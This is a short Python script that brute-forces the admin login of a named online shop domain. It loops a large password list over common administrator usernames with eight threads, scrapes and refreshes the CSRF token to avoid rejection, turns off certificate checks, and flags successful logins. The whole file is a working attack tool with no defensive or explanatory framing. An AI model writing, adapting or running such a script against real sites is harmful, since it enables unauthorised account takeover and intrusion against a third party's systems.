import httpx, re, threading
from concurrent.futures import ThreadPoolExecutor
URL='https://ofa77.shop/module/admin/unionshop/user/login'
UA={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121 Safari/537.36'}
pwds=[l.strip() for l in open('ofa77_pwds_big.txt') if l.strip()]
users=['admin','administrator','root','manager','superadmin','ofa77']
lock=threading.Lock()
found=[]; cnt=[0]
def worker(args):
    slice_pw, _ = args
    try:
        c=httpx.Client(verify=False, timeout=20, headers=UA)
        tok=None
        def gt():
            nonlocal tok
            r=c.get(URL); m=re.search(r'name="_token" value="([^"]+)"', r.text); tok=m.group(1) if m else ''
        gt()
        n=0
        for p in slice_pw:
            for u in users:
                if n%80==0: gt()
                try:
                    r=c.post(URL, data={'_token':tok,'username':u,'password':p}, follow_redirects=True)
                    n+=1
                    with lock: cnt[0]+=1
                    ok = (r.status_code==302 and 'login' not in r.headers.get('location','')) or \
                         (('dashboard' in r.text or 'logout' in r.text) and '密碼錯誤' not in r.text and '帳號不存在' not in r.text)
                    if ok:
                        with lock: found.append((u,p,r.status_code))
                    if r.status_code==419: gt()
                except Exception: pass
        c.close()
    except Exception: pass
# split passwords into 4 slices
chunks=[pwds[i::8] for i in range(8)]
with ThreadPoolExecutor(max_workers=8) as ex:
    list(ex.map(worker, [(c_,0) for c_ in chunks]))
print(f'DONE posts={cnt[0]} found={found}')
